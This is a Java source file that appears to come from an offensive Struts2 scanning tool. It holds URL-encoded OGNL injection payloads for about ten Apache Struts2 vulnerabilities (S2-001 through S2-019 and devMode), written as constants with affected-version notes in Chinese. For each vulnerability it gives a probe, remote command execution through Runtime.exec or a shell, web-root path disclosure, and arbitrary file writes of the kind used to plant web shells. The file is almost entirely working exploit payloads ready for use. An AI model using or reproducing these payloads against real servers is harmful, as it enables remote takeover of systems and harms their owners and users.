package fx.com.Payload;

import fx.com.Utils.RandomUtils;

import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

public class Spayload {

    public static final class Method {
        private Method() {
        }

        public static final String GET = "GET";
        public static final String POST = "POST";
        public static final String HEAD = "HEAD";
        public static final String OPTIONS = "OPTIONS";
        public static final String PUT = "PUT";
        public static final String DELETE = "DELETE";
        public static final String TRACE = "TRACE";
    }

    public static final class VulnType {
        private VulnType() {
        }

        public static final String POC = "POC";
        public static final String EXEC = "EXEC";
        public static final String PATH = "PATH";
        public static final String UPLOAD = "UPLOAD";
        public static final String USER_UPLOAD = "USER_UPLOAD";
    }

    public static final class PAYLOADSTR {
        private PAYLOADSTR() {
        }

        public static int r1 = RandomUtils.randomInt(4);
        public static int r2 = RandomUtils.randomInt(4);
        public static String results = (r1 * r2) + "";
        public static String WIN = "%27cmd%27%2c%27%2fc%27%2c";
        public static String LIN = "%27%2fbin%2fsh%27%2c%27-c%27%2c";

        public static final String INFO0 = "";
        public static final String POC0 = "";
        public static final String EXEC0 = "";
        public static final String PATH0 = "";
        public static final String UPLOAD0 = "";
        public static final String USER_UPLOAD0 = "";
        //Struts2_001 POST 需要参数 upload 需要get参数传递shell内容，用"|"分割
        public static final String INFO001 = "[+] S2-001:影响版本Struts 2.0.0-2.0.8; POST请求发送数据; ";
        public static final String POC001 = "%25%7B" + r1 + "%2B" + r2 + "%7D";
        public static final String EXEC001 = "%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B{OS}%22{EXEC}%22,%22%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D";
        public static final String PATH001 = "%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest%28%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%23req.getRealPath%28%27%2F%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%7D";
        public static final String UPLOAD001 = "filename={FILENAME}&content={FILECONTENT}|%25%7b%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest%28%29%2c%23outstr%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2cnew+java.io.BufferedWriter%28new+java.io.FileWriter%28%23req.getRealPath%28%27%2f%27%29%2b%27%2f%27%2b%23req.getParameter%28%27filename%27%29%29%29.append%28%23req.getParameter%28%27content%27%29%29.close%28%29%2c%23outstr.print%28%27UPLO%27%29%2c%23outstr.println%28%27AD-OK%27%29%2c%23outstr.close%28%29%7d";
        public static final String USER_UPLOAD001 = "realpath={REALPATH}&content={FILECONTENT}|%25%7b%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest%28%29%2c%23outstr%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2cnew+java.io.BufferedWriter%28new+java.io.FileWriter%28%23req.getParameter%28%27realpath%27%29%29%29.append%28%23req.getParameter%28%27content%27%29%29.close%28%29%2c%23outstr.print%28%27UPLO%27%29%2c%23outstr.println%28%27AD-OK%27%29%2c%23outstr.close%28%29%7d";


        public static final String INFO005 = "[+] S2-005:影响版本Struts 2.0.0-2.1.8.1; ";
        public static final String POC005 = "%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75%40java.util.Collections%40EMPTY_SET%27%29%28c%29%29=&%28b%29%28%28%27%5C43context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5C75false%27%29%28b%29%29=&%28g%29%28%28%27%5C43req%5C75%40org.apache.struts2.ServletActionContext%40getRequest%28%29%27%29%28d%29%29=&%28i2%29%28%28%27%5C43xman%5C75%40org.apache.struts2.ServletActionContext%40getResponse%28%29%27%29%28d%29%29=&%28i97%29%28%28%27%5C43xman.getWriter%28%29.println%28" + r1 + "%2A" + r2 + "%29%27%29%28d%29%29=&%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29=";
        public static final String EXEC005 = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43mycmd\\75\\'{EXEC}\\'')(d))&(h)(('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')(d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')(d))&(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))";
        public static final String PATH005 = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43xman.getWriter().println(\\43req.getRealPath(%22\\u005c%22))')(d))&(i99)(('\\43xman.getWriter().close()')(d))";
        public static final String UPLOAD005 = "('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023foo')(\\u0023foo\\u003dnew%20java.lang.Boolean(%22false%22)))=&(i1)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))=&(i12)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i13)(('\\43xman.getWriter().println(\\43req.getServletContext().getRealPath(%22\\u005c%22))')(d))=&(i2)(('\\43fos\\75new\\40java.io.FileOutputStream(new\\40java.lang.StringBuilder(\\43req.getRealPath(%22\\u005c%22)).append(%22/{FILENAME}%22).toString())')(d))=&(i3)(('\\43fos.write(\\43req.getParameter(%22t%22).getBytes())')(d))=&(i4)(('\\43fos.close()')(d))(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i95)(('\\43xman.getWriter().print(\"UPLO\")')(d))=&(i96)(('\\43xman.getWriter().println(\"AD-OK\")')(d))=&(i99)(('\\43xman.getWriter().close()')(d))=&t={FILECONTENT}";
        public static final String USER_UPLOAD005 = "('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023foo')(\\u0023foo\\u003dnew%20java.lang.Boolean(%22false%22)))=&(i1)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))=&(i12)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i13)(('\\43xman.getWriter().println(\\43req.getServletContext().getRealPath(%22\\u005c%22))')(d))=&(i2)(('\\43fos\\75new\\40java.io.FileOutputStream(new\\40java.io.FileOutputStream(%5C43req.getParameter(%22path%22))')(d))=&(i3)(('\\43fos.write(\\43req.getParameter(%22t%22).getBytes())')(d))=&(i4)(('\\43fos.close()')(d))(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i95)(('\\43xman.getWriter().print(\"UPLO\")')(d))=&(i96)(('\\43xman.getWriter().println(\"AD-OK\")')(d))=&(i99)(('\\43xman.getWriter().close()')(d))=&t={FILECONTENT}&path={REALPATH}";


        //Struts2_007 POST 需要参数 upload 需要get参数传递shell内容，用"|"分割
        public static final String INFO007 = "[+] S2-007:影响版本Struts 2.0.0-2.2.3; ";
        public static final String POC007 = "'%2b(" + r1 + "*" + r2 + ")%2b'";
        public static final String EXEC007 = "%27%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{EXEC}').getInputStream()))%20%2B%20%27";
        public static final String PATH007 = "%27%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest()%2c%23k8out%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23k8out.println(%23req.getRealPath(%22%2f%22))%2c%23k8out.close())%20%2B%20%27";
        public static final String UPLOAD007 = "filename={FILENAME}&content={FILECONTENT}|%27%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest()%2c%23outstr%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2cnew%20java.io.BufferedWriter(new%20java.io.FileWriter(%23req.getRealPath(%27%2f%27)%2b%27%2f%27%2b%23req.getParameter(%27filename%27))).append(%23req.getParameter(%27content%27)).close(),%23outstr.print(%22UPLO%22),%23outstr.println(%22AD-OK%22),%23outstr.close())%20%2B%20%27";
        public static final String USER_UPLOAD007 = "realpath={REALPATH}&content={FILECONTENT}|%27%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest()%2c%23outstr%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2cnew%20java.io.BufferedWriter(new%20java.io.FileWriter(%23req.getParameter(%27realpath%27))).append(%23req.getParameter(%27content%27)).close(),%23outstr.print(%22UPLO%22),%23outstr.println(%22AD-OK%22),%23outstr.close())%20%2B%20%27";

        //Struts2_008 POST
        public static final String INFO008 = "[+] S2-008:影响版本Struts 2.1.0-2.3.1; ";
        public static final String POC008 = "debug=command&expression=(" + r1 + "*" + r2 + ")";
        public static final String EXEC008 = "debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{EXEC}%27%29.getInputStream%28%29%29)";
        public static final String PATH008 = "debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%23req%3d@org.apache.struts2.ServletActionContext@getRequest%28%29%2c%23k8out%3d@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2c%23k8out.println%28%23req.getRealPath%28%27%2f%27%29%29%2c%23k8out.close%28%29)";
        public static final String UPLOAD008 = "filename={FILENAME}&content={FILECONTENT}|debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%23req%3d@org.apache.struts2.ServletActionContext@getRequest%28%29%2c%23outstr%3d@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2cnew+java.io.BufferedWriter%28new+java.io.FileWriter%28%23req.getRealPath%28%27%2f%27%29%2b%27%2f%27%2b%23req.getParameter%28%27filename%27%29%29%29.append%28%23req.getParameter%28%27content%27%29%29.close%28%29%2c%23outstr.print%28%27UPLO%27%29%2c%23outstr.println%28%27AD-OK%27%29%2c%23outstr.close%28%29)";
        public static final String USER_UPLOAD008 = "realpath={REALPATH}&content={FILECONTENT}|debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%23req%3d@org.apache.struts2.ServletActionContext@getRequest%28%29%2c%23outstr%3d@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2cnew+java.io.BufferedWriter%28new+java.io.FileWriter%28%23req.getParameter%28%27realpath%27%29%29%29.append%28%23req.getParameter%28%27content%27%29%29.close%28%29%2c%23outstr.print%28%27UPLO%27%29%2c%23outstr.println%28%27AD-OK%27%29%2c%23outstr.close%28%29)";
        //Struts2_009 POST
        public static final String INFO009 = "[+] S2-009:影响版本Struts 2.0.0-2.3.1.1; ";
        public static final String POC009 = "class.classLoader.jarPath=%28%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23outstr%3d@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2c%23outstr.print%28" + r1 + "*" + r2 + "%29%2c%23outstr.close%28%29%29%28meh%29&z%5b%28class.classLoader.jarPath%29%28%27meh%27%29%5d=";
        public static final String EXEC009 = "class.classLoader.jarPath=%28%23context[\"xwork.MethodAccessor.denyMethodExecution\"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess[\"allowStaticMethodAccess\"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27{EXEC}%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]";
        public static final String PATH009 = "class.classLoader.jarPath=(#context[\"xwork.MethodAccessor.denyMethodExecution\"]= new java.lang.Boolean(false), #_memberAccess[\"allowStaticMethodAccess\"]=true,#req=@org.apache.struts2.ServletActionContext@getRequest(),#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#outstr.println(#req.getRealPath(\"/\")),#outstr.close())(meh)&z[(class.classLoader.jarPath)('meh')]";
        public static final String UPLOAD009 = "class.classLoader.jarPath=%28%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23req%3d@org.apache.struts2.ServletActionContext@getRequest%28%29%2c%23outstr%3d@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2c%23fos%3d+new+java.io.FileOutputStream%28%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%2b%27%2f%27%2b%23req.getParameter%28%22f%22%29%29%2c%23fos.write%28%23req.getParameter%28%22t%22%29.getBytes%28%29%29%2c%23fos.close%28%29%2c%23outstr.print%28%22UPLO%22%29%2c%23outstr.println%28%22AD-OK%22%29%2c%23outstr.close%28%29%29%28meh%29&z%5b%28class.classLoader.jarPath%29%28%27meh%27%29%5d=%0d&t={FILECONTENT}&f={FILENAME}";
        public static final String USER_UPLOAD009 = "class.classLoader.jarPath=(%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D=%20new%20java.lang.Boolean(false),%20%23_memberAccess%5B%22allowStaticMethodAccess%22%5D=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23fos=%20new%20java.io.FileOutputStream(%23req.getParameter(%22f%22)),%23fos.write(%23req.getParameter(%22t%22).getBytes()),%23fos.close(),%23outstr.print(%22UPLO%22),%23outstr.println(%22AD-OK%22),%23outstr.close())(meh)&z%5B(class.classLoader.jarPath)('meh')%5D=&t={FILECONTENT}&f={REALPATH}";


        //Struts2_012 POST
        public static final String INFO012 = "[+] S2-012:影响版本Struts Showcase App 2.0.0-2.3.13; ";
        public static final String POC012 = "";
        public static final String EXEC012 = "";
        public static final String PATH012 = "";
        public static final String UPLOAD012 = "";
        public static final String USER_UPLOAD012 = "";

        // http://:8080/S2-009/integration/saveGangster.action
        // __checkbox_bustedBefore=true&age=12345678&bustedBefore=true&description=192.168.2.3&name=payload
        //Struts2_013 POST 需要参数 upload 需要get参数传递shell内容，用"|"分割
        public static final String INFO013 = "[+] S2-013/S2-014:影响版本Struts 2.0.0-2.3.14.1; ";
        public static final String POC013 = "%24%7B" + r1 + "%2A" + r2 + "%7D";
        public static final String EXEC013 = "%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('{EXEC}').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%23d)%2C%23out.close())%7D";
        public static final String PATH013 = "24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23k8out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23k8out.println(%23req.getRealPath(%22%2F%22))%2C%23k8out.close())%7D";
        public static final String UPLOAD013 = "filename={FILENAME}&content={FILECONTENT}|%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23req.getRealPath(%27%2f%27)%2b%27%2f%27%2b%23req.getParameter(%27filename%27))).append(%23req.getParameter(%27content%27)).close(),%23outstr.print(%22UPLO%22),%23outstr.println(%22AD-OK%22),%23outstr.close())%7D";
        public static final String USER_UPLOAD013 = "realpath={REALPATH}&content={FILECONTENT}|%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23req.getParameter(%27realpath%27))).append(%23req.getParameter(%27content%27)).close(),%23outstr.print(%22UPLO%22),%23outstr.println(%22AD-OK%22),%23outstr.close())%7D";

        //Struts2_015 GET   use: xxx.action/EXEC015.action  包含|分割
        public static final String INFO015 = "[+] S2-015:影响版本Struts 2.0.0-2.3.14.2; ";
        public static final String POC015 = "/$%7B" + r1 + "%2A" + r2 + "%7D.action";
        public static final String EXEC015 = "/%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{EXEC}').getInputStream())%2C%23q%7D.action";
        public static final String PATH015 = "/%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23req%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')%2C%23resp%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23resp.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23resp.getWriter().println(%23req.getSession().getServletContext().getRealPath(%23parameters.pp%5B0%5D))%2C%23resp.getWriter().flush()%2C%23resp.getWriter().close()%7D.action?pp=%2f&encoding={ENCODE}";
        public static final String UPLOAD015 = "/%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest()%2C%23res%3D@org.apache.struts2.ServletActionContext@getResponse()%2C%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23w%3D%23res.getWriter()%2C%23path%3D%23req.getRealPath(%23parameters.pp%5B0%5D)%2Cnew%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path+%23parameters.shellname%5B0%5D).append(%23parameters.shellContent%5B0%5D)).close()%2C%23w.print(%23parameters.content1%5B0%5D)%2C%23w.print(%23parameters.content2%5B0%5D)%2C%23w.close()%2C1%3f%23xx:%23request.toString%7D.action|shellname={FILENAME}&shellContent={FILECONTENT}&encoding={ENCODE}&pp=%2f&content1=UPLO&content2=AD-OK";
        public static final String USER_UPLOAD015 = "/%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest()%2C%23res%3D@org.apache.struts2.ServletActionContext@getResponse()%2C%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23w%3D%23res.getWriter()%2Cnew%20java.io.BufferedWriter(new%20java.io.FileWriter(%23parameters.pp%5B0%5D).append(%23parameters.scontent%5B0%5D)).close()%2C%23w.print(%23parameters.content1%5B0%5D)%2C%23w.print(%23parameters.content2%5B0%5D)%2C%23w.close()%2C1%3f%23xx:%23request.toString%7D.action|scontent={FILECONTENT}&encoding={ENCODE}&pp={REALPATH}&content1=UPLO&content2=AD-OK";
        //Struts2_016 POST
        public static final String INFO016 = "[+] S2-016:影响版本Struts 2.0.0-2.3.15; ";
        public static final String POC016 = "redirect%3A%24%7B" + r1 + "%2A" + r2 + "%7D=";
        public static final String EXEC016 = "redirect:%24%7B%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B{OS}%27{EXEC}%27%7D%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23dis.close%28%29%2C%23resp.getWriter%28%29.println%28%23msg.trim%28%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29%7D";
        public static final String PATH016 = "redirect:%24%7B%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp.getWriter%28%29.println%28%23req.getRealPath%28%22%2F%22%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29%7D";
        public static final String UPLOAD016 = "redirect%3a%24%7b%23req%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2c%23res%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2c%23res.getWriter%28%29.print%28%27UPLO%27%29%2c%23res.getWriter%28%29.print%28%27AD-OK%27%29%2c%23res.getWriter%28%29.flush%28%29%2c%23res.getWriter%28%29.close%28%29%2cnew+java.io.BufferedWriter%28new+java.io.FileWriter%28%23req.getRealPath%28%27%2f%27%29%2b%27%2f%27%2b%23req.getParameter%28%27filename%27%29%29%29.append%28%23req.getParameter%28%27content%27%29%29.close%28%29%7d&content={FILECONTENT}&filename={FILENAME}";
        public static final String USER_UPLOAD016 = "redirect%3a%24%7b%23req%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2c%23res%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2c%23res.getWriter%28%29.print%28%27UPLO%27%29%2c%23res.getWriter%28%29.print%28%27AD-OK%27%29%2c%23res.getWriter%28%29.flush%28%29%2c%23res.getWriter%28%29.close%28%29%2cnew+java.io.BufferedWriter%28new+java.io.FileWriter%28%23req.getParameter%28%27filename%27%29%29%29.append%28%23req.getParameter%28%27content%27%29%29.close%28%29%7d&content={FILECONTENT}&realpath={REALPATH}";

        //Struts2_019 POST
        public static final String INFO019 = "[+] S2-019:影响版本Struts 2.0.0-2.3.15.1; ";
        public static final String POC019 = "debug=command&expression=(" + r1 + "*" + r2 + ")";
        public static final String EXEC019 = "debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27{EXEC}%27%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23dis.close%28%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23msg%3D%23msg.trim%28%29";
        public static final String PATH019 = "debug=command&expression=%23req%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')%2C%23resp%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23resp.setCharacterEncoding('{ENCODE}')%2C%23resp.getWriter().println(%23req.getSession().getServletContext().getRealPath('%2F'))%2C%23resp.getWriter().flush()%2C%23resp.getWriter().close()";
        public static final String UPLOAD019 = "debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest%28%29%2C%23resp%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29%2C%23path%3D%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%22%2F%22%29%2C%23content%3Dnew+java.lang.String%28%22{FILECONTENT}%22%29%2C%23file%3Dnew+java.io.File%28%23path+%2B%22%2F{FILENAME}%22%29%2C%23fos%3Dnew+java.io.FileOutputStream%28%23file%29%2C%23fos.write%28%23content.getBytes%28%29%29%2C%23fos.flush%28%29%2C%23fos.close%28%29%2C%23resp.getWriter%28%29.print%28%22UPLO%22%29%2C%23resp.getWriter%28%29.println%28%22AD-OK%22%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29";
        public static final String USER_UPLOAD019 = "debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest%28%29%2C%23resp%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29%2C%23path%3Dnew+java.lang.String%28%22{REALPATH}%22%29%2C%23content%3Dnew+java.lang.String%28%22{FILECONTENT}%22%29%2C%23file%3Dnew+java.io.File%28%23path%29%2C%23fos%3Dnew+java.io.FileOutputStream%28%23file%29%2C%23fos.write%28%23content.getBytes%28%29%29%2C%23fos.flush%28%29%2C%23fos.close%28%29%2C%23resp.getWriter%28%29.print%28%22UPLO%22%29%2C%23resp.getWriter%28%29.println%28%22AD-OK%22%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29";

        //Struts2_Dev POST
        public static final String INFO_DEV = "[+] S2-devMode:影响版本Struts 2.1.0-2.3.1; ";
        public static final String POC_DEV = "debug=browser&object=%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2c%23res%3d@org.apache.struts2.ServletActionContext@getResponse%28%29%2c%23w%3d%23res.getWriter%28%29%2c%23w.print%28" + r1 + "*" + r2 + "%29%29";
